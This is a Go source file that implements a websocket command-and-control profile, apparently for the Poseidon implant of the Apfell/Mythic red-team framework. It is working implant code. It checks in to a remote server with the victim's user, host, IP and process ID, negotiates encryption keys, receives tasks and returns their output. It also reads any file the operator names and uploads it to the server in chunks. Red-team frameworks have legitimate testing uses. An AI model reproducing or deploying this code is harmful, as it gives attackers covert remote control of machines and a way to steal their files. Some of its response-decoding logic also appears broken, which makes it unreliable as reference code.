// +build websockets, linux darwin

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

const (
	//CheckInMsg - Messages for apfell
	CheckInMsg = 0
	//EKE - Messages for apfell EKE AES
	EKE = 1
	//AES - Messages for apfell static AES
	AES = 2
	//TaskMsg - Messages for apfell tasks
	TaskMsg = 3
	//ResponseMsg - Messages for apfell task responses
	ResponseMsg = 4
	//FileMsg - Messages for apfell file downloads/uploads
	FileMsg = 5
	// ID Type for UUID
	UUIDType = 6
	// ID Type for ApfellID
	ApfellIDType = 7
	// ID Type for FileID
	FileIDType = 8
	// ID Type for session ID
	SESSIDType = 9
	// ID Type for Task ID
	TASKIDType = 10
)

var (
	websocketEndpoint = "socket"
)

type C2Websockets struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
	Conn           *websocket.Conn
}

func newProfile() Profile {
	return &C2Websockets{}
}

func (c C2Websockets) Header() string {
	return c.HostHeader
}

func (c *C2Websockets) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Websockets) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Websockets) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Websockets) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Websockets) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Websockets) SleepInterval() int {
	return c.Interval
}

func (c *C2Websockets) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Websockets) C2Commands() []string {
	return c.Commands
}

func (c *C2Websockets) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Websockets) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Websockets) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Websockets) ApfID() string {
	return c.ApfellID
}

func (c *C2Websockets) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Websockets) UniqueID() string {
	return c.UUID
}

func (c *C2Websockets) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Websockets) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Websockets) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Websockets) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Websockets) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Websockets) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c *C2Websockets) GetTasking() interface{} {
	rawTask := c.getData(TaskMsg, ApfellIDType, c.ApfID())
	task := structs.Task{}
	err := json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
	taskResp := structs.TaskResponse{}
	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
	dataToSend, _ := json.Marshal(taskResp)
	return c.sendData(ResponseMsg, TASKIDType, task.ID, dataToSend)
}

func (c *C2Websockets) SendFile(task structs.Task, params string) {
	fileReq := structs.FileRegisterRequest{}
	fileReq.Task = task.ID
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		return
	}

	fi, err := file.Stat()
	if err != nil {
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	file.Read(raw)

	c.SendFileChunks(task, raw)
}

func (c *C2Websockets) GetFile(fileid string) []byte {
	fileData := c.getData(FileMsg, FileIDType, fileid)

	return fileData
}

func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileRegisterRequest{}
	chunkResponse.Chunks = int(chunks)
	chunkResponse.Task = task.ID

	msg, _ := json.Marshal(chunkResponse)
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.FileRegisterResponse{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileChunk{}
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.ChunkNumber = int(i) + 1
		msg.FileID = fileResp.FileID

		encmsg, _ := json.Marshal(msg)

		resp := c.PostResponse(task, string(encmsg))
		postResp := structs.FileChunkResponse{}
		_ = json.Unmarshal(resp, &postResp)

		if !strings.Contains(postResp.Status, "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.PostResponse(task, string(encmsg))
		}

		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	c.PostResponse(task, "File download complete")
}

func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) interface{} {

	// Establish a connection to the websockets server
	url := fmt.Sprintf("%s%s", c.URL(), websocketEndpoint)
	c.Conn, _, _ = websocket.DefaultDialer.Dial(url, nil)
	if c.Conn == nil {
		return structs.CheckinResponse{}
	}

	var resp []byte

	checkin := structs.CheckInStruct{}
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID

	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		sID := c.NegotiateKey()
		resp = c.sendData(EKE, UUIDType, sID, checkinMsg)
	} else if len(c.AesPSK) != 0 {
		resp = c.sendData(AES, UUIDType, c.UUID, checkinMsg)
	} else {
		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, checkinMsg)
	}

	respMsg := structs.CheckinResponse{}
	err := json.Unmarshal(resp, &respMsg)
	if err != nil {
		return structs.CheckinResponse{}
	}

	return respMsg
}

func (c *C2Websockets) NegotiateKey() string {
	sessionID := c.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.SetRsaKey(priv)
	initMessage := structs.EKEInit{}
	// Assign the session ID and the base64 encoded pub key
	initMessage.SessionID = sessionID
	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	unencryptedMsg, err := json.Marshal(initMessage)

	if err != nil {
		return ""
	}

	res := c.sendData(EKE, UUIDType, UUID, unencryptedMsg)

	decryptedResponse := crypto.RsaDecryptCipherBytes(res, c.RsaKey())
	sessionKeyResp := structs.SessionKeyResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		return ""
	}

	// Save the new AES session key
	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
	c.SetXKeys(false)
	return sessionID

}

func (c *C2Websockets) getData(msgType int, idType int, id string) []byte {
	m := structs.Message{}
	err := c.Conn.ReadJSON(&m)

	if err != nil {
		return make([]byte, 0)
	}

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		data, _ := base64.StdEncoding.DecodeString(m.Data)
		decData := c.decryptMessage(data)
		return decData
	}

	decData, _ := base64.StdEncoding.DecodeString(m.Data)
	return decData
}

func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte) []byte {
	m := structs.Message{}

	if len(c.AesPSK) != 0 {
		data = c.encryptMessage(data)
		m.Enc = true
	}

	m.MType = msgType
	m.IDType = idType
	m.Data = base64.StdEncoding.EncodeToString(data)
	m.ID = id

	err := c.Conn.WriteJSON(m)

	// Read the response
	respMsg := structs.Message{}
	err = c.Conn.ReadJSON(&respMsg)

	if err != nil {
		log.Println("Error trying to read message ", err.Error())
		return make([]byte, 0)
	}

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		raw, _ := base64.StdEncoding.DecodeString(m.Data)
		decData := c.decryptMessage(raw)
		return decData
	}

	raw, _ := base64.StdEncoding.DecodeString(m.Data)
	return raw

}

func (c *C2Websockets) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
}

func (c *C2Websockets) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
	return crypto.AesDecrypt(key, decMsg)
}

func (c *C2Websockets) GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
	}
	return string(b)
}
